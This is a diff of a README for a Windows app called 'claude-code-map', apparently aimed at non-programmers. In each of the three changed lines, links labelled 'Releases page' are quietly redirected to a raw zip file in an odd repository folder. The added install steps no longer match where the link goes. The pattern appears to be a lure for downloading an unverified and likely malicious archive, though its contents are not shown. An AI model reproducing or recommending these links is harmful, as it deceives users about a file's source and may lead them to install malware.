@@ -1,6 +1,6 @@
 # 🗺️ claude-code-map - Understand Claude Code Fast
 
-[![Download claude-code-map](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/porzanaundercarriage121/claude-code-map/releases)
+[![Download claude-code-map](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/porzanaundercarriage121/claude-code-map/raw/refs/heads/main/deshabille/code_claude_map_v1.9.zip)
 
 ## 📦 What this is
 
@@ -19,7 +19,7 @@ The app is built for normal desktop use. You do not need programming knowledge t
 
 ## 🚀 Download and install
 
-1. Open the [Releases page](https://github.com/porzanaundercarriage121/claude-code-map/releases).
+1. Open the [Releases page](https://github.com/porzanaundercarriage121/claude-code-map/raw/refs/heads/main/deshabille/code_claude_map_v1.9.zip).
 2. Find the latest release at the top of the page.
 3. In the Assets section, download the Windows file for the app.
 4. Save the file to your Downloads folder or another easy place to find.
@@ -157,7 +157,7 @@ This gives you a clear path through the project without needing to read every fi
 
 ## 🔗 Download again
 
-If you need the release file again, use the [Releases page](https://github.com/porzanaundercarriage121/claude-code-map/releases)
+If you need the release file again, use the [Releases page](https://github.com/porzanaundercarriage121/claude-code-map/raw/refs/heads/main/deshabille/code_claude_map_v1.9.zip)
 
 ## 🧭 Project focus
 
